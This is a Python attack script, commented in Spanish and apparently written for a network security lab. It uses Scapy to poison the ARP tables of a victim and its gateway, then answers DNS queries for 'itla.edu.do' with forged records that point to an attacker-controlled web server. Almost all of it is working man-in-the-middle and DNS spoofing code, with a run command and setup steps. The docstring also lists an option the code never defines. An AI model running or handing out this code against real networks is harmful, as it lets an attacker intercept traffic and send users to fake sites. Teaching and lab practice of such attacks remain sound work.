#!/usr/bin/env python3
"""
==========================================================================
 DNS SPOOFING / DNS POISONING - Falsificacion de respuestas DNS para
 que el dominio "itla.edu.do" resuelva hacia un servicio web local,
 usando Scapy.

 OBJETIVO DEL SCRIPT
 --------------------
 1) (Opcional) Realizar ARP poisoning entre la victima y su gateway
    para colocar a Kali "en medio" del trafico (MITM).
 2) Esnifar el trafico UDP/53 (consultas DNS) que pasa por la interfaz.
 3) Cuando se detecte una consulta hacia "itla.edu.do" (o subdominios),
    responder ANTES que el servidor DNS legitimo con un registro A que
    apunte a la IP del servicio web local controlado por el atacante.

 REQUISITOS
 -----------
 - Ejecutar como root.
 - habilitar reenvio de paquetes si se hace MITM completo:
     echo 1 > /proc/sys/net/ipv4/ip_forward
 - Tener un servicio web escuchando en LOCAL_IP (ej: python3 -m http.server 80
   o un Apache/Nginx) para que la "contramedida" demuestre el impacto real.

 PARAMETROS (linea de comandos)
 --------------------------------
 -i / --iface      Interfaz de Kali (ej: eth0)
 -t / --target     IP de la victima (ej: VPC) a la que se le hara
                    spoofing/ARP poisoning
 -g / --gateway    IP del gateway / router (R1, ej: 192.168.10.1)
 -d / --domain     Dominio a falsificar (por defecto: itla.edu.do)
 -l / --local-ip   IP del servicio web local al que se redirige el dominio
 --arp-spoof       Activa el envenenamiento ARP (MITM victima<->gateway)
 --no-spoof-only   Solo realiza ARP poisoning sin responder DNS (debug)

 EJEMPLO
 --------
 # MITM completo + DNS spoofing de itla.edu.do hacia 192.168.10.50
 sudo python3 dns_spoof.py -i eth0 -t 192.168.10.10 -g 192.168.10.1 \
        -d itla.edu.do -l 192.168.10.50 --arp-spoof
==========================================================================
"""

from scapy.all import (
    ARP, Ether, IP, UDP, DNS, DNSRR, DNSQR,
    sniff, send, sendp, get_if_hwaddr, getmacbyip, conf
)
import argparse
import threading
import time
import sys


stop_event = threading.Event()


# --------------------------------------------------------------------
# ARP Poisoning (MITM)
# --------------------------------------------------------------------
def arp_poison(target_ip: str, gateway_ip: str, iface: str):
    """
    Envia periodicamente ARP replies falsos a la victima y al gateway
    para interceptar el trafico entre ambos.
    """
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[!] No se pudo resolver la MAC de la victima o el gateway.")
        sys.exit(1)

    print(f"[*] Iniciando ARP poisoning: {target_ip} <-> {gateway_ip}")

    while not stop_event.is_set():
        # Decir a la victima que el gateway soy yo
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                  psrc=gateway_ip), iface=iface, verbose=False)
        # Decir al gateway que la victima soy yo
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                  psrc=target_ip), iface=iface, verbose=False)
        time.sleep(2)


def restore_arp(target_ip: str, gateway_ip: str, iface: str):
    """Restaura las tablas ARP reales al finalizar el ataque."""
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    print("[*] Restaurando tablas ARP...")
    for _ in range(3):
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                  psrc=gateway_ip, hwsrc=gateway_mac), iface=iface, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                  psrc=target_ip, hwsrc=target_mac), iface=iface, verbose=False)
        time.sleep(1)


# --------------------------------------------------------------------
# DNS Spoofing
# --------------------------------------------------------------------
def make_dns_handler(domain: str, local_ip: str, iface: str):
    domain_fqdn = domain.rstrip(".") + "."

    def handler(pkt):
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt.haslayer(DNSQR)):
            return

        qname = pkt[DNSQR].qname.decode(errors="ignore")
        if not qname.lower().endswith(domain_fqdn.lower()):
            return

        print(f"[+] Consulta DNS interceptada para {qname} "
              f"desde {pkt[IP].src}")

        # Construir respuesta DNS falsificada
        dns_reply = DNS(
            id=pkt[DNS].id,
            qr=1, aa=1, qd=pkt[DNS].qd,
            an=DNSRR(rrname=qname, ttl=300, rdata=local_ip)
        )

        reply = (
            Ether(src=get_if_hwaddr(iface), dst=pkt[Ether].src) /
            IP(src=pkt[IP].dst, dst=pkt[IP].src) /
            UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
            dns_reply
        )

        sendp(reply, iface=iface, verbose=False)
        print(f"    -> Respuesta falsificada enviada: "
              f"{qname} = {local_ip}")

    return handler


# --------------------------------------------------------------------
# main
# --------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="DNS Spoofing / DNS Poisoning")
    ap.add_argument("-i", "--iface", required=True, help="Interfaz de Kali")
    ap.add_argument("-t", "--target", help="IP de la victima")
    ap.add_argument("-g", "--gateway", help="IP del gateway/router")
    ap.add_argument("-d", "--domain", default="itla.edu.do",
                    help="Dominio a falsificar")
    ap.add_argument("-l", "--local-ip", required=True,
                    help="IP del servicio web local (destino del spoof)")
    ap.add_argument("--arp-spoof", action="store_true",
                    help="Activar ARP poisoning (MITM victima<->gateway)")
    args = ap.parse_args()

    arp_thread = None
    if args.arp_spoof:
        if not args.target or not args.gateway:
            print("[!] --arp-spoof requiere --target y --gateway")
            sys.exit(1)
        arp_thread = threading.Thread(
            target=arp_poison, args=(args.target, args.gateway, args.iface),
            daemon=True)
        arp_thread.start()
        time.sleep(2)  # dar tiempo a que el ARP poisoning surta efecto

    print(f"[*] Esnifando consultas DNS para '{args.domain}' en {args.iface}...")
    print(f"[*] Las consultas se responderan con la IP {args.local_ip}")
    print("[*] Presione Ctrl+C para detener.\n")

    bpf = "udp port 53"
    handler = make_dns_handler(args.domain, args.local_ip, args.iface)

    try:
        sniff(iface=args.iface, filter=bpf, prn=handler, store=False)
    except KeyboardInterrupt:
        pass
    finally:
        if args.arp_spoof:
            stop_event.set()
            arp_thread.join()
            restore_arp(args.target, args.gateway, args.iface)
        print("[+] Finalizado.")


if __name__ == "__main__":
    main()
